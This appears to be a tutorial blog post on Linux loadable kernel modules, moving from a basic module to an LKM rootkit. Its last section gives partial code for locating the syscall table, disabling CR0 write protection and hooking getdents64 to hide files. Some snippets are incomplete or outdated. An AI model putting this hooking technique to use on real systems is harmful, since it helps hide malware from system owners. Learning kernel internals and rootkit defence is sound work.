<img src="img/tux.jpg">
© 2021 BrunoCiccarino 

<a href="https://github.com/Ch4r0nN/LKM-Exploration/blob/main/LICENSE">LICENSE</a>

Hey folks! Today, I’m going to walk you through LKMs (Loadable Kernel Modules)—from a simple "Hello World" module all the way to creating an LKM rootkit. If you find this helpful, feel free to share it, and thanks in advance to everyone who reads till the end. You'll find all the code and references linked at the bottom of the post, so be sure to check out the sources. Trust me, digging into those and modifying the code will really help you learn more. Heads-up though—some of the code is under the GPL 3 license, so make sure you’re aware of the terms.

What You’ll Need:

`linux-headers-generic`
`A C compiler (I recommend GCC or cc)`

Table of Contents:

* 1) What is LKM and how it works
* 2) Example LKM Makefile
* 3) How modules get loaded into the kernel
* 4) LKM "Hello World"
* 5) Key changes over the years
* 6) Syscall table changes in Kernel 5.7
* 7) LKM for process monitoring
* 8) Building an LKM rootkit

### 1) What is LKM and how it works:
LKMs are Loadable Kernel Modules that help the Linux kernel extend its functionality—like adding drivers for hardware without needing to recompile the entire kernel. They’re perfect for device drivers (like sound cards), file systems, etc. Every LKM at the very least needs these two basic functions:

```c
static int __init module_init(void)
{
    return 0;
}

static void __exit module_exit(void)
{
}
```

### 2) Example LKM Makefile:
Here’s a super simple Makefile for compiling your module:

```Makefile
obj-m := example.o
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
 $(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
 $(MAKE) -C $(KDIR) M=$(PWD) clean
```

### 3) How Modules Get Loaded into the Kernel:
You can see the modules loaded into the kernel with the lsmod command. It checks the info in /proc/modules. Modules usually identify the kernel through aliases like this:

`alias char-major-10–30 softdog`

This tells modprobe that the `softdog.o` module should be loaded, and it checks `/lib/modules/version/modules.dep` for dependencies created by running `depmod -a`.

### 4) LKM "Hello World":
Here’s how to make a super basic "Hello World" module:

```c
#include <linux/module.h> 
#include <linux/kernel.h> 
#include <linux/init.h>   

static int __init hello_init(void)
{
    printk(KERN_INFO "<1>Hello World\n");
    return 0;
}

static void __exit hello_exit(void)
{
    printk(KERN_INFO"<1> Bye bye!");
}

module_init(hello_init);
module_exit(hello_exit);

MODULE_AUTHOR("BrunoCiccarino");
MODULE_LICENSE("GPL");
```

### 5) Key Changes in LKM over the Years:
There have been some pretty significant changes in LKMs over time, so let’s break them down by Linux kernel version:

Kernel 2.x (up to 2.6):

Initial support for dynamic LKM loading and unloading.
Better debugging tools (OOPS, PANIC).
Kernel 2.6.x:

Introduction of udev for better device management.
Preemptive kernel for quicker response times.
Native Posix Thread Library (NPTL) improves handling of multithreaded processes.
Kernel 3.x:

Support for namespaces, improving container tech like Docker.
Filesystem and GPU driver improvements.
Kernel 4.x:

Kernel security gets a boost with KASLR.
Better container support (Cgroups, namespaces).
New hardware support.
Kernel 5.x:

Better filesystem encryption and live patching.
Expansion of BPF beyond just networks.
Better RISC-V and ARM support.
Kernel 5.7:

Major change: the syscall table (sys_call_table) became less accessible for security reasons. Modules that needed to modify the syscall table had to adapt.
Kernel 6.x:

Rust language support for safer kernel module development.
Security and isolation improvements, with a focus on energy efficiency for mobile devices.

### 6) Changes in the Syscall Table in Kernel 5.7:
In Linux 5.7, changes were made to protect the syscall table. It’s now write-protected and not easily accessible, which is a big win for security but complicated things for legitimate modules that rely on it. If you were using kprobes.h to find the sys_call_table, you’d need a new strategy. Now, you can’t modify it directly due to protections like Write-Protection (WP).

### 7) LKM for Process Monitoring:
This is a module that monitors processes in the kernel by periodically running checks (e.g., every 2 seconds) using a timer. It watches for things like process creation and termination, file access, and network usage.

Here’s a bit of code to get you started with that:

```c
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/timer.h>
#include <linux/cred.h>

static struct timer_list procmonitor_timer;

static void procmonitor_check_proc_tree(unsigned long unused)
{
    struct task_struct *task;
    for_each_process(task)
        printk(KERN_INFO "process: %s, PID: %d\n", task->comm, task->pid);

    mod_timer(&procmonitor_timer, jiffies + msecs_to_jiffies(2000));
}

static int __init procmonitor_init(void)
{
    setup_timer(&procmonitor_timer, procmonitor_check_proc_tree, 0);
    mod_timer(&procmonitor_timer, jiffies + msecs_to_jiffies(200));
    return 0;
}

static void __exit procmonitor_exit(void)
{
    del_timer_sync(&procmonitor_timer);
}

module_init(procmonitor_init);
module_exit(procmonitor_exit);
```

### 8) LKM Rootkits:
Rootkits are basically malicious modules that hijack system calls to hide malware. Here’s how they hook into the syscall table and modify behavior.

First, you need to locate the syscall table:

```c
unsigned long *find_syscall_table(void)
{
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    return (unsigned long*)kallsyms_lookup_name("sys_call_table");
}
```

Then, you can unprotect the memory where the syscall table is:

```c
static inline void unprotect_memory(void)
{
    write_cr0_forced(cr0 & ~0x00010000);
}
```

After that, replace the original function with your hook:

```c
static int __init ghost_init(void)
{
    __syscall_table = find_syscall_table();
    if (!__syscall_table) return -1;

    cr0 = read_cr0();
    orig_getdents64 = (void *)__syscall_table[MY_NR_getdents];
    unprotect_memory();
    __syscall_table[MY_NR_getdents] = (unsigned long)hook_getdents64;
    protect_memory();
    return 0;
}
```

The hook function intercepts and hides files:

```c
asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int ret = orig_getdents64(fd, dirp, count);
    // Intercept the syscall here...
    return ret;
}
```

![Image description](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v5l3gkesr11o1czfupbq.png)

### Credits
[The Hackers Choice](http://www.ouah.org/LKM_HACKING.html)
[elinux](https://elinux.org/Deferred_Initcalls)
[kernel br](https://github.com/kernelbr)
[xcellerator](https://xcellerator.github.io/posts/linux_rootkits_11)
[lkmpg](https://sysprog21.github.io/lkmpg/)
[cat enjoyer](https://telegra.ph/Hooking-linux-kernel-FIFOs-05-21)
[My rootkit](https://github.com/BrunoCiccarino/HiddenGhost)
[diamorphine](https://github.com/m0nad/Diamorphine)
